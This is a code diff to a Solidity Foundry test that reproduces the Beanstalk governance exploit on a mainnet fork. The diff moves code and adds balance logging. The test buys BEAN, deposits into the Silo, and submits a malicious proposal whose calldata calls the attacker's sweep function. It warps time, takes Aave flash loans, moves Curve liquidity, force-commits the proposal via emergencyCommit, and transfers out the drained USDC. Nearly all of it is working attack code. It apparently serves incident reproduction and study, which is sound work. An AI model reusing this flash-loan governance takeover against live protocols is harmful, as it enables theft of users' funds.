@@ -30,6 +30,46 @@ contract ContractTest is DSTest {
 
   constructor() {
     cheat.createSelectFork("mainnet", 14595905); // fork mainnet at block 14595905
+  }
+
+  function testExploit() public {
+    address[] memory path = new address[](2);
+    path[0] = uniswapv2.WETH();
+    path[1] = address(bean);
+    uniswapv2.swapExactETHForTokens{ value: 75 ether }(
+      0,
+      path,
+      address(this),
+      block.timestamp + 120
+    );
+    emit log_named_uint(
+      "Initial USDC balancer of attacker",
+      usdc.balanceOf(address(this))
+    );
+
+    emit log_named_uint(
+      "After initial ETH -> BEAN swap, Bean balance of attacker:",
+      bean.balanceOf(address(this)) / 1e6
+    );
+    bean.approve(address(siloV2Facet), type(uint256).max);
+    siloV2Facet.depositBeans(bean.balanceOf(address(this)));
+    emit log_named_uint(
+      "After BEAN deposit to SiloV2Facet, Bean balance of attacker:",
+      bean.balanceOf(address(this)) / 1e6
+    );
+    IBeanStalk.FacetCut[] memory _diamondCut = new IBeanStalk.FacetCut[](0);
+    bytes memory data = abi.encodeWithSelector(ContractTest.sweep.selector);
+    //emit log_named_uint("BIP:", bip);
+    // function propose(
+    //     IDiamondCut.FacetCut[] calldata _diamondCut,
+    //     address _init,
+    //     bytes calldata _calldata,
+    //     uint8 _pauseOrUnpause
+    // )
+    // https://dashboard.tenderly.co/tx/mainnet/0x68cdec0ac76454c3b0f7af0b8a3895db00adf6daaf3b50a99716858c4fa54c6f
+    beanstalkgov.propose(_diamondCut, address(this), data, 3);
+
+    cheat.warp(block.timestamp + 24 * 60 * 60); //travelling 1 day in the future
 
     dai.approve(address(aavelendingPool), type(uint256).max);
     usdc.approve(address(aavelendingPool), type(uint256).max);
@@ -52,37 +92,7 @@ contract ContractTest is DSTest {
       address(siloV2Facet),
       type(uint256).max
     );
-  }
 
-  function testExploit() public {
-    address[] memory path = new address[](2);
-    path[0] = uniswapv2.WETH();
-    path[1] = address(bean);
-    uniswapv2.swapExactETHForTokens{ value: 75 ether }(
-      0,
-      path,
-      address(this),
-      block.timestamp + 120
-    );
-    emit log_named_uint(
-      "Initial USDC balancer of attacker",
-      usdc.balanceOf(address(this))
-    );
-
-    emit log_named_uint(
-      "After initial ETH -> BEAN swap, Bean balance of attacker:",
-      bean.balanceOf(address(this)) / 1e6
-    );
-    siloV2Facet.depositBeans(bean.balanceOf(address(this)));
-    emit log_named_uint(
-      "After BEAN deposit to SiloV2Facet, Bean balance of attacker:",
-      bean.balanceOf(address(this)) / 1e6
-    );
-    IBeanStalk.FacetCut[] memory _diamondCut = new IBeanStalk.FacetCut[](0);
-    bytes memory data = abi.encodeWithSelector(ContractTest.sweep.selector);
-    //emit log_named_uint("BIP:", bip);
-    beanstalkgov.propose(_diamondCut, address(this), data, 3);
-    uint256[3] memory tempAmounts;
 
     address[] memory assets = new address[](3);
     assets[0] = address(dai);
@@ -103,6 +113,10 @@ contract ContractTest is DSTest {
       address(this),
       new bytes(0),
       0
+    );
+    emit log_named_uint(
+      "After Flashloan repay, usdc balance of attacker:",
+      usdc.balanceOf(address(this))
     );
     usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
   }
@@ -132,14 +146,13 @@ contract ContractTest is DSTest {
       crvbean.balanceOf(address(this))
     );
     emit log_named_uint(
-      "After  , Curvebean3Crv_f balance of attacker:",
+      "After Curvebean3Crv_f balance of attacker:",
       IERC20(address(bean3Crv_f)).balanceOf(address(this))
     ); //@note logging balance for same token ?
     siloV2Facet.deposit(
       address(bean3Crv_f),
       IERC20(address(bean3Crv_f)).balanceOf(address(this))
     );
-    cheat.warp(block.timestamp + 24 * 60 * 60); //travelling 1 day in the future
     //beanstalkgov.vote(bip); --> this line not needed, as beanstalkgov.propose() already votes for our bip
     beanstalkgov.emergencyCommit(bip);
     emit log_named_uint(
@@ -158,6 +171,13 @@ contract ContractTest is DSTest {
     tempAmounts[0] = amounts[0] + premiums[0];
     tempAmounts[1] = amounts[1] + premiums[1];
     tempAmounts[2] = amounts[2] + premiums[2];
+    emit log_named_uint("premiums[0]:", premiums[0]);
+    emit log_named_uint("premiums[1]:", premiums[1]);
+    emit log_named_uint("premiums[2]:", premiums[2]);
+    emit log_named_uint("tempAmounts[0]:", tempAmounts[0]);
+    emit log_named_uint("tempAmounts[1]:", tempAmounts[1]);
+    emit log_named_uint("tempAmounts[2]:", tempAmounts[2]);
+
     threeCrvPool.remove_liquidity_imbalance(tempAmounts, type(uint256).max);
     threeCrvPool.remove_liquidity_one_coin(
       threeCrv.balanceOf(address(this)),
